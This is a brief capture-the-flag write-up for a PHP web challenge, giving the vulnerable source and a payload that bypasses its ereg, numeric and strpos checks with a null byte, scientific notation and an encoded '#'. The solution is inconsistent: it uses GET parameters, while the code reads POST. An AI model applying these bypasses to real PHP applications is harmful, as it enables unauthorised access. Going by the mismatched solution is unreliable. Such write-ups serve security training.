# Challenge 
```php 
<?php  
  if (isset($_GET['view-source'])) {
  header('Location: http://challenge1.xa.honyasec.com/index.php');
  show_source(__FILE__);
         exit();
    }
if (isset($_POST["submit"]))  
{
  if (isset($_POST['hihi']))
  {
    if (ereg("^[a-zA-Z0-9]+$", $_POST['hihi']) === FALSE)
    {
      exit('<script>alert("have fun:)")</script>');
    }
    elseif (strlen($_POST['hihi']) < 11 && $_POST['hihi'] > 999999999)
    {
      if (strpos($_POST['hihi'], '#HONG#') !== FALSE)
      {
        if (!is_array($_POST['hihi'])) {
        include("flag.php");
        echo "Congratulations! FLAG is : ".$flag;
        }
        else
      {
        exit('<script>alert("nonono")</script>');
      }
      }
      else
      {
        exit('<script>alert("nonono")</script>');
      }
    }
    else
    {
      exit('<script>alert("sorry")</script>');
    }
  }
}
?>
<a href="?view-source">view-source</a>  
```

# Solution

```
Greg() 用%00绕过

if (strlen($_GET['hihi']) < 11 && $_GET['hihi'] > 999999999）
用科学计数法 9e9

strpos($_GET['hihi'], '#HONG#')
加上%23HONG%23

```

payload

```
?submit=1&hihi=9e9%00%23HONG%23
```

# Refference

+ [2016第二届陕西省网络空间安全大赛: 0x01 web](https://www.ycjcl.cc/2016/05/29/di-er-jie-shan-xi-sheng-wang-luo-kong-jian-an-quan-da-sai-writeup/)

